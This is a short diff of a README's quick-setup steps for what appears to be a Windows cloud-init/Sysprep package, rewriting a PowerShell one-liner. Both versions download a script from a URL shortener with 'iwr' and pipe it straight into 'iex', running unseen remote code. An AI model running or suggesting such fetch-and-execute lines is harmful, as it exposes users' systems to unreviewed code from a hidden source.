@@ -14,7 +14,7 @@ Place all files from repo in c:\cloud-init
 
 **Quick Setup**
 ```
-Download package: . { iwr -useb https://t.ly/5kgtP } | iex;
+Download package: iwr -useb https://t.ly/5kgtP|iex;
 To Start Sysprep: c:\cloud-init\install
 ```
 
